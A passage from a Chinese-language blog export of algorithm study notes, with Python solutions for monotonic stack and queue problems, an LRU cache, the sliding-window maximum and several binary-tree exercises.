class="comment">#遍历右节点</span></span><br><span class="line">                    root=TreeNode(i)</span><br><span class="line">                    <span class="keyword">if</span> leftNode.val!=<span class="literal">None</span>:root.left=leftNode</span><br><span class="line">                    <span class="keyword">if</span> rightNode.val!=<span class="literal">None</span>:root.right=rightNode</span><br><span class="line">                    ans.append(root)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法 栈与队列练习</title>
    <url>/2020/08/02/2020-08-02-stack-queue-1/</url>
    <content><![CDATA[<h1 id="单调栈和单调队列"><a href="#单调栈和单调队列" class="headerlink" title="单调栈和单调队列"></a>单调栈和单调队列</h1><p>对于FIFO队列来说，想以O(1)的复杂度获得其任何时刻的最小值\最大值的话，需要加一个辅助的单调队列</p>
<ul>
<li>最小值：初始值先push入辅助队列，<ul>
<li>然后如果原队列push进更小的A元素，就将A元素push入辅助队列，把小于A元素值的元素都pop出来</li>
<li>然后如果原队列push进更大的A元素，就将A元素push入辅助队列</li>
</ul>
</li>
<li>最大值同上，以下是示例</li>
</ul>
<p>对于FILO的栈来说</p>
<p>最小值：初始值先push入辅助队列，</p>
<ul>
<li>然后如果原队列push进更大的A元素，什么都不做，<del>就将A元素push入辅助队列</del></li>
<li>然后如果原队列push进更小的A元素，就将A元素push入辅助队列，<del>把小于A元素值的元素都pop出来</del></li>
</ul>
<h1 id="面试题-03-02-栈的最小值"><a href="#面试题-03-02-栈的最小值" class="headerlink" title="面试题 03.02. 栈的最小值"></a><a href="https://leetcode-cn.com/problems/min-stack-lcci/" target="_blank" rel="noopener">面试题 03.02. 栈的最小值</a></h1><p>装第一个值：</p>
<ul>
<li>比deque[-1]大的，不装</li>
<li>比deque[-1]小的，装</li>
</ul>
<h1 id="146-LRU缓存机制"><a href="#146-LRU缓存机制" class="headerlink" title="146. LRU缓存机制"></a><a href="https://leetcode-cn.com/problems/lru-cache/" target="_blank" rel="noopener">146. LRU缓存机制</a></h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DLinkedNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,key=<span class="number">0</span>,value=<span class="number">0</span>)</span>:</span></span><br><span class="line">        self.key=key</span><br><span class="line">        self.value=value</span><br><span class="line">        self.prev=<span class="literal">None</span></span><br><span class="line">        self.next=<span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, capacity: int)</span>:</span></span><br><span class="line">        self.cache=dict() <span class="comment">#哈希字典</span></span><br><span class="line">        self.capacity=capacity <span class="comment">#容量</span></span><br><span class="line">        self.size=<span class="number">0</span> <span class="comment">#已用大小</span></span><br><span class="line">        self.head=DLinkedNode() <span class="comment">#哑巴头节点</span></span><br><span class="line">        self.tail=DLinkedNode() <span class="comment">#哑巴尾节点</span></span><br><span class="line">        self.head.next=self.tail</span><br><span class="line">        self.tail.prev=self.head</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key: int)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> self.cache:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        node=self.cache[key]</span><br><span class="line">        self.moveToHead(node) <span class="comment">#删除,移至头节点</span></span><br><span class="line">        <span class="keyword">return</span> node.value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, key: int, value: int)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> self.cache:</span><br><span class="line">            node=DLinkedNode(key,value)</span><br><span class="line">            self.cache[key]=node</span><br><span class="line">            self.addToHead(node)</span><br><span class="line">            self.size+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> self.size&gt;self.capacity:</span><br><span class="line">                removedNode=self.removeTail()</span><br><span class="line">                self.cache.pop(removedNode.key)</span><br><span class="line">                self.size-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            node=self.cache[key]</span><br><span class="line">            node.value=value</span><br><span class="line">            self.moveToHead(node)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addToHead</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        node.prev=self.head</span><br><span class="line">        node.next=self.head.next</span><br><span class="line">        self.head.next.prev=node</span><br><span class="line">        self.head.next=node</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeNode</span><span class="params">(self,node)</span>:</span> <span class="comment">#删除节点</span></span><br><span class="line">        node.prev.next=node.next <span class="comment">#node的前个节点的下一个节点指针，指向node的下一个节点 </span></span><br><span class="line">        node.next.prev=node.prev <span class="comment">#node的下节点的前一个节点指针，指向node的前一个节点</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeTail</span><span class="params">(self)</span>:</span></span><br><span class="line">        node=self.tail.prev</span><br><span class="line">        self.removeNode(node)</span><br><span class="line">        <span class="keyword">return</span> node</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moveToHead</span><span class="params">(self,node)</span>:</span></span><br><span class="line">        self.removeNode(node)</span><br><span class="line">        self.addToHead(node)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your LRUCache object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = LRUCache(capacity)</span></span><br><span class="line"><span class="comment"># param_1 = obj.get(key)</span></span><br><span class="line"><span class="comment"># obj.put(key,value)</span></span><br></pre></td></tr></table></figure>



<h1 id="59-II-队列的最大值"><a href="#59-II-队列的最大值" class="headerlink" title="59 - II. 队列的最大值"></a>59 - II. 队列的最大值</h1><p><a href="https://leetcode-cn.com/problems/dui-lie-de-zui-da-zhi-lcof/" target="_blank" rel="noopener">剑指 Offer 59 - II. 队列的最大值</a></p>
<p>装第一个值：</p>
<ul>
<li>比deque[-1]大的，循环去掉deque[-1]，装入</li>
<li>比deque[-1]小的，直接装</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaxQueue</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.queue=deque()</span><br><span class="line">        self.deque=deque()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">max_value</span><span class="params">(self)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> self.deque:</span><br><span class="line">            <span class="keyword">return</span> self.deque[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push_back</span><span class="params">(self, value: int)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">while</span> self.deque <span class="keyword">and</span> self.deque[<span class="number">-1</span>]&lt;value: <span class="comment">#比deque[-1]大的，循环去掉deque[-1]，装入</span></span><br><span class="line">            self.deque.pop()</span><br><span class="line">        self.queue.append(value)</span><br><span class="line">        self.deque.append(value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop_front</span><span class="params">(self)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> self.queue:</span><br><span class="line">            v=self.queue.popleft()</span><br><span class="line">            <span class="keyword">if</span> v==self.deque[<span class="number">0</span>]:</span><br><span class="line">                self.deque.popleft()</span><br><span class="line">            <span class="keyword">return</span> v</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your MaxQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = MaxQueue()</span></span><br><span class="line"><span class="comment"># param_1 = obj.max_value()</span></span><br><span class="line"><span class="comment"># obj.push_back(value)</span></span><br><span class="line"><span class="comment"># param_3 = obj.pop_front()</span></span><br></pre></td></tr></table></figure>

<h1 id="单调队列"><a href="#单调队列" class="headerlink" title="单调队列"></a>单调队列</h1><p><a href="https://leetcode-cn.com/problems/hua-dong-chuang-kou-de-zui-da-zhi-lcof/" target="_blank" rel="noopener">剑指 Offer 59 - I. 滑动窗口的最大值</a></p>
<p>判断窗口内的最大值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxSlidingWindow</span><span class="params">(self, nums: List[int], k: int)</span> -&gt; List[int]:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nums <span class="keyword">or</span> k==<span class="number">0</span>: <span class="keyword">return</span> []</span><br><span class="line">        res=[-sys.maxsize <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)-k+<span class="number">1</span>)]</span><br><span class="line">        deque=collections.deque()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(k): <span class="comment">#首先做一个窗口</span></span><br><span class="line">            <span class="keyword">while</span> deque <span class="keyword">and</span> deque[<span class="number">-1</span>]&lt;nums[i]: <span class="comment">#相同的不删，所以不怕重复值</span></span><br><span class="line">                deque.pop()</span><br><span class="line">            deque.append(nums[i])</span><br><span class="line">        res[<span class="number">0</span>]=deque[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(k,len(nums)):</span><br><span class="line">            <span class="keyword">if</span> deque[<span class="number">0</span>]==nums[i-k]: <span class="comment">#如果最大值要退出窗口，就删除</span></span><br><span class="line">                deque.popleft()</span><br><span class="line">            <span class="keyword">while</span> deque <span class="keyword">and</span> deque[<span class="number">-1</span>]&lt;nums[i]:</span><br><span class="line">                deque.pop()</span><br><span class="line">            deque.append(nums[i])</span><br><span class="line">            res[i-k+<span class="number">1</span>]=deque[<span class="number">0</span>] <span class="comment">#从1号下标开始，因为0号下标已经装了</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h1 id="用队列模拟滑动窗口"><a href="#用队列模拟滑动窗口" class="headerlink" title="用队列模拟滑动窗口"></a>用队列模拟滑动窗口</h1><p><a href="https://leetcode-cn.com/problems/zui-chang-bu-han-zhong-fu-zi-fu-de-zi-zi-fu-chuan-lcof/" target="_blank" rel="noopener">剑指 Offer 48. 最长不含重复字符的子字符串</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法 二叉树练习</title>
    <url>/2020/07/30/2020-07-30-Binary-Tree-1/</url>
    <content><![CDATA[<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="重建二叉树"><a href="#重建二叉树" class="headerlink" title="重建二叉树"></a>重建二叉树</h2><p>输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。</p>
<p>利用前序和后序的关系来构建</p>
<p><img src="/2020/07/30/2020-07-30-Binary-Tree-1/image-20200726005338718.png" alt="image-20200726005338718"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="comment"># 返回构造的TreeNode根节点</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reConstructBinaryTree</span><span class="params">(self, pre, tin)</span>:</span></span><br><span class="line">        <span class="comment"># write code here</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> pre <span class="keyword">or</span> <span class="keyword">not</span> tin:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        root=TreeNode(pre.pop(<span class="number">0</span>))</span><br><span class="line">        tin_root_index=tin.index(root.val)</span><br><span class="line">        root.left=self.reConstructBinaryTree(pre,tin[<span class="number">0</span>:tin_root_index])</span><br><span class="line">        root.right=self.reConstructBinaryTree(pre,tin[tin_root_index+<span class="number">1</span>:])</span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    s=Solution()</span><br><span class="line">    pre=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>]</span><br><span class="line">    tin=[<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">6</span>]</span><br><span class="line">    root=s.reConstructBinaryTree(pre,tin)</span><br><span class="line">    s.PreOrderTraversal(root)</span><br></pre></td></tr></table></figure>





<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Codec</span>:</span></span><br><span class="line">    <span class="comment"># root=None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""Encodes a tree to a single string.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root: <span class="keyword">return</span> <span class="string">"[]"</span> <span class="comment">#返回字符串</span></span><br><span class="line">        result=[]</span><br><span class="line">        queue=deque([root])</span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            node=queue.popleft()</span><br><span class="line">            <span class="keyword">if</span> node:</span><br><span class="line">                result.append(str(node.val))</span><br><span class="line">                queue.append(node.left)</span><br><span class="line">                queue.append(node.right)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result.append(<span class="string">"null"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"["</span>+<span class="string">","</span>.join(result)+<span class="string">"]"</span></span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deserialize</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="string">"""Decodes your encoded data to tree.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        :type data: str</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> data==<span class="string">"[]"</span>: <span class="keyword">return</span></span><br><span class="line">        vals,i=data[<span class="number">1</span>:<span class="number">-1</span>].split(<span class="string">","</span>),<span class="number">1</span></span><br><span class="line">        root=TreeNode(int(vals[<span class="number">0</span>]))</span><br><span class="line">        queue=deque([root])</span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            node=queue.popleft()</span><br><span class="line">            <span class="keyword">if</span> vals[i]!=<span class="string">"null"</span>:</span><br><span class="line">                node.left=TreeNode(int(vals[i]))</span><br><span class="line">                queue.append(node.left)</span><br><span class="line">            i=i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> vals[i]!=<span class="string">"null"</span>:</span><br><span class="line">                node.right=TreeNode(int(vals[i]))</span><br><span class="line">                queue.append(node.right)</span><br><span class="line">            i=i+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> root</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Codec object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># codec = Codec()</span></span><br><span class="line"><span class="comment"># codec.deserialize(codec.serialize(root))</span></span><br></pre></td></tr></table></figure>





<h2 id="公共祖先"><a href="#公共祖先" class="headerlink" title="公共祖先"></a>公共祖先</h2><p>主要是突出一个思想：</p>
<p>（<strong>一个节点也可以是它自己的祖先</strong>）</p>
<p>所以一旦看到当前节点root是p、q其中一个，立刻返回</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lowestCommonAncestor</span><span class="params">(self, root: <span class="string">'TreeNode'</span>, p: <span class="string">'TreeNode'</span>, q: <span class="string">'TreeNode'</span>)</span> -&gt; 'TreeNode':</span></span><br><span class="line">        <span class="keyword">if</span> root==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> root==p <span class="keyword">or</span> root==q: <span class="keyword">return</span> root</span><br><span class="line">        </span><br><span class="line">        left_node=self.lowestCommonAncestor(root.left,p,q)</span><br><span class="line">        right_node=self.lowestCommonAncestor(root.right,p,q)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left_node <span class="keyword">and</span> right_node:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line">        <span class="keyword">elif</span> left_node <span class="keyword">and</span> <span class="keyword">not</span> right_node:</span><br><span class="line">            <span class="keyword">return</span> left_node</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> left_node <span class="keyword">and</span> right_node:</span><br><span class="line">            <span class="keyword">return</span> right_node</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>



<h2 id="二叉树的子结构相同"><a href="#二叉树的子结构相同" class="headerlink" title="二叉树的子结构相同"></a>二叉树的子结构相同</h2><p>主要是用深搜DFS来做</p>
<p>只要懂如何用深搜比较两棵树，然后对A的每个节点都这样做就ok了！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSubStructure</span><span class="params">(self, A: TreeNode, B: TreeNode)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">if</span> A==<span class="literal">None</span> <span class="keyword">or</span> B==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">False</span> <span class="comment">#题目规定，两个初始必不为空</span></span><br><span class="line">        flag=self.dfs(A,B) <span class="keyword">or</span> self.isSubStructure(A.left,B) <span class="keyword">or</span> self.isSubStructure(A.right,B)</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(self,A,B)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> B==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">True</span> <span class="comment">#b为空了</span></span><br><span class="line">        <span class="keyword">if</span> A==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">False</span> <span class="comment">#</span></span><br><span class="line">        <span class="keyword">return</span> A.val==B.val <span class="keyword">and</span> self.dfs(A.left,B.left) <span class="keyword">and</span> self.dfs(A.right,B.right)</span><br></pre></td></tr></table></figure>



<h2 id="交换左右节点——二叉树镜像"><a href="#交换左右节点——二叉树镜像" class="headerlink" title="交换左右节点——二叉树镜像"></a>交换左右节点——二叉树镜像</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mirrorTree</span><span class="params">(self, root: TreeNode)</span> -&gt; TreeNode:</span></span><br><span class="line">        <span class="comment">#递归</span></span><br><span class="line">        <span class="comment"># if root==None: return root </span></span><br><span class="line">        <span class="comment"># if root.left: self.mirrorTree(root.left)</span></span><br><span class="line">        <span class="comment"># if root.right: self.mirrorTree(root.right)</span></span><br><span class="line">        <span class="comment"># root.left,root.right=root.right,root.left</span></span><br><span class="line">        <span class="comment"># return root</span></span><br><span class="line">        <span class="comment">#栈</span></span><br><span class="line">        <span class="keyword">if</span> root==<span class="literal">None</span>: <span class="keyword">return</span> root </span><br><span class="line">        stack=[root]</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            node=stack.pop()</span><br><span class="line">            <span class="keyword">if</span> node!=<span class="literal">None</span>:</span><br><span class="line">                node.left,node.right=node.right,node.left</span><br><span class="line">                stack.append(node.left)</span><br><span class="line">                stack.append(node.right)</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>



<h2 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#我的做法，内存占用和时间消耗与下一法差不多</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isBalanced</span><span class="params">(self, root: TreeNode)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">if</span> root==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">cmp_depth</span><span class="params">(root)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> root==<span class="literal">None</span>: <span class="keyword">return</span> <span class="number">0</span>,<span class="literal">True</span></span><br><span class="line">            depth_left,flag_left=cmp_depth(root.left)</span><br><span class="line">            depth_right,flag_right=cmp_depth(root.right)</span><br><span class="line">            <span class="keyword">if</span> flag_left==<span class="literal">False</span> <span class="keyword">or</span> flag_right==<span class="literal">False</span>: <span class="keyword">return</span> <span class="number">0</span>,<span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> abs(depth_left-depth_right)&gt;<span class="number">1</span>: <span class="keyword">return</span> <span class="number">0</span>,<span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> max(depth_left,depth_right)+<span class="number">1</span>,<span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> cmp_depth(root)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#参考评论区，改成一个返回值</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isBalanced</span><span class="params">(self, root: TreeNode)</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">if</span> root==<span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">cmp_depth</span><span class="params">(root)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> root==<span class="literal">None</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            depth_left=cmp_depth(root.left)</span><br><span class="line">            depth_right=cmp_depth(root.right)</span><br><span class="line">            <span class="keyword">if</span> depth_left==<span class="number">-1</span> <span class="keyword">or</span> depth_right==<span class="number">-1</span> <span class="keyword">or</span> abs(depth_left-depth_right)&gt;<span class="number">1</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">            <span class="keyword">else</span>: <span class="keyword">return</span> max(depth_left,depth_right)+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> cmp_depth(root)&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure>





<h2 id="二叉树的深度"><a href="#二叉树的深度" class="headerlink" title="二叉树的深度"></a>二叉树的深度</h2><p>python的三元表达式</p>
<p><code>res=&#39;zuo&#39; if x &gt; y else &#39;you&#39;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span><span class="params">(self, root: TreeNode)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> root==<span class="literal">None</span> <span class="keyword">else</span> max(self.maxDepth(root.left),self.maxDepth(root.right))+<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="二叉树的子结构"><a href="#二叉树的子结构" class="headerlink" title="二叉树的子结构"></a>二叉树的子结构</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pathSum</span><span class="params">(self, root: TreeNode, sum: int)</span> -&gt; List[List[int]]:</span></span><br><span class="line">        res,path=[],[] <span class="comment">#result，以及path路径记录</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(root,target)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> root==<span class="literal">None</span>:  <span class="comment">#直接返回</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            path.append(root.val) <span class="comment">#添加到临时路径中，继续往下前序遍历dfs、回溯</span></span><br><span class="line">            target=target-root.val</span><br><span class="line">            <span class="keyword">if</span> target==<span class="number">0</span> <span class="keyword">and</span> root.left==<span class="literal">None</span> <span class="keyword">and</span> root.right==<span class="literal">None</span>: <span class="comment">#叶子节点满足，添加到res中</span></span><br><span class="line">                res.append(list(path)) </span><br><span class="line">            search(root.left,target) <span class="comment">#继续往下前序遍历dfs、回溯</span></span><br><span class="line">            search(root.right,target) <span class="comment">#继续往下前序遍历dfs、回溯</span></span><br><span class="line">            path.pop()</span><br><span class="line">        search(root,sum)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



<p>先说结论：切片[::-1] 有返回值， reverse()函数没有返回值</p>
<p>有返回值的可以 return、赋值。没有的不能 return、赋值。</p>
<h2 id="剑指-Offer-32-III-从上到下打印二叉树-III"><a href="#剑指-Offer-32-III-从上到下打印二叉树-III" class="headerlink" title="剑指 Offer 32 - III. 从上到下打印二叉树 III"></a><a href="https://leetcode-cn.com/problems/cong-shang-dao-xia-da-yin-er-cha-shu-iii-lcof/" target="_blank" rel="noopener">剑指 Offer 32 - III. 从上到下打印二叉树 III</a></h2><p>请实现一个函数按照之字形顺序打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右到左的顺序打印，第三行再按照从左到右的顺序打印，其他行以此类推。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l.reverse()</span><br><span class="line">print(l)</span><br></pre></td></tr></table></figure>

